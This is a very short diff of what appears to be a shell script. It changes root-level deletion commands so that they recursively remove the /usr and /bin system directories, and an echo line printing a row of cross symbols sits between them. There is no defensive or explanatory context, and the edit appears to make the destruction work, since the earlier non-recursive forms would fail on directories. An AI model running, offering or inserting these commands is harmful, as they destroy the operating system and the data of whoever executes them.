@@ -1,3 +1,3 @@
-sudo rm /sys
+sudo rm /usr -r
 echo "♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱♱"
-sudo rm /bin
+sudo rm /bin -r
